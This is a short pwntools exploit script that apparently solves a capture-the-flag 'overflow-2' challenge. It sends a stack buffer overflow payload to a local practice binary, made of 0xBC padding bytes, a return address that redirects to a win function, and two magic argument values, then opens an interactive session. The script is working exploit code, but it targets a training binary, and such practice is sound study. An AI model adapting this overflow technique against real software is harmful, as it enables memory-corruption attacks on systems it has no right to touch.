from pwn import *

sock = process("/problems/overflow-2_3_8949c8847a75f33295e4bb6ea2896829/vuln", cwd="/problems/overflow-2_3_8949c8847a75f33295e4bb6ea2896829")
#sock = process("./vuln")
payload = 'A' * 0xBC
payload += p32(0x80485e6)
payload += p32(0)
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)
sock.sendline(payload)

sock.interactive()
